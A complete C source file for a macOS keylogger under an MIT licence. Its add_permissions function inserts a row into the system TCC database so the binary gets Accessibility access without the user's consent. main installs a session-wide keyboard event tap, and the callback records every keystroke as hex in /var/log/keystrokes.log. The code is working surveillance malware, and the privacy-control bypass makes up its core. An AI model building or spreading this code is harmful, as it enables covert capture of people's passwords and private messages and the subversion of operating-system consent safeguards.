/*
    Copyright (c) 2015 Lunge Technology, LLC

    Permission is hereby granted, free of charge, to any person obtaining a
    copy of this software and associated documentation files (the "Software"),
    to deal in the Software without restriction, including without limitation
    the rights to use, copy, modify, merge, publish, distribute, sublicense,
    and/or sell copies of the Software, and to permit persons to whom the
    Software is furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in
    all copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
    FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
    DEALINGS IN THE SOFTWARE.
*/

#include <ApplicationServices/ApplicationServices.h>
#include <libproc.h>
#include <sqlite3.h>
#include <stdio.h>

#define ACCESSIBILITY_DB "/Library/Application Support/com.apple.TCC/TCC.db"
#define LOGFILE "/var/log/keystrokes.log"
#define MAX_UNICHAR_SIZE 255

static FILE *log_file;
static int counter;
char *get_bin_path(void);
void add_permissions(char *db_path);
CGEventRef callback(CGEventTapProxy, CGEventType, CGEventRef, void *);

char *get_bin_path(void) {
    int ret;
    pid_t pid;
    char *buf;
    buf = malloc(PROC_PIDPATHINFO_MAXSIZE + 1);

    if (!buf)
        return NULL;

    pid = getpid();
    ret = proc_pidpath(pid, buf, PROC_PIDPATHINFO_MAXSIZE);

    if (ret <= 0) {
        free(buf);
        buf = NULL;
    }

    return buf;
}

void add_permissions(char *db_path) {
    char *bin_path;
    int rc;
    sqlite3 *db;
    char *sql;
    char *zErrMsg = 0;
    bin_path = get_bin_path();

    if (!bin_path) {
        fprintf(stderr, "unable to get bin path\n");
        exit(-1);
    }

    rc = sqlite3_open(db_path, &db);

    if (rc) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
        exit(-1);
    }

    asprintf(&sql, "INSERT or REPLACE INTO access VALUES('kTCCServiceAccessibility','%s',1,1,1,NULL)", bin_path);

    if (!sql) {
        fprintf(stderr, "unable to build sql\n");
        exit(-1);
    }

    rc = sqlite3_exec(db, sql, NULL, 0, &zErrMsg);

    if (rc != SQLITE_OK) {
        fprintf(stderr, "SQL error: %s\n", zErrMsg);
        exit(-1);
    }

    rc = sqlite3_close(db);

    if (rc) {
        fprintf(stderr, "Can't close database: %s\n", sqlite3_errmsg(db));
        exit(-1);
    }

    if (bin_path) free(bin_path);

    if (zErrMsg) sqlite3_free(zErrMsg);

    if (sql) free(sql);
}

int main(int argc, const char *argv[]) {
    CGEventMask mask;
    CGEventFlags flags;
    CFMachPortRef tap;
    CFRunLoopSourceRef loop;
    (void)(argc);
    (void)(argv);
    add_permissions(ACCESSIBILITY_DB);
    mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
    flags = CGEventSourceFlagsState(kCGEventSourceStateCombinedSessionState);
    tap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, mask, callback, &flags);

    if (!tap) {
        fprintf(stderr, "unable to create event tap.\n");
        exit(1);
    }

    loop = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, tap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), loop, kCFRunLoopCommonModes);
    CGEventTapEnable(tap, true);
    counter = 0;
    log_file = fopen(LOGFILE, "a");

    if (!log_file)
        fprintf(stderr, "unable to open log\n");

    CFRunLoopRun();
    return 0;
}

CGEventRef callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *unused) {
    UniChar chars[MAX_UNICHAR_SIZE];
    UniCharCount len;
    UniCharCount i;
    (void)(proxy);
    (void)(type);
    (void)(unused);

    CGEventKeyboardGetUnicodeString(event, MAX_UNICHAR_SIZE, &len, chars);

    if (len) {
        for (i = 0; i < len; i++)
            fprintf(log_file, "%02hx", chars[i]);

        fprintf(log_file, " ");
        counter++;

        if (counter >= 16) {
            fprintf(log_file, "\n");
            counter = 0;
        }

        fflush(log_file);
    }

    return event;
}
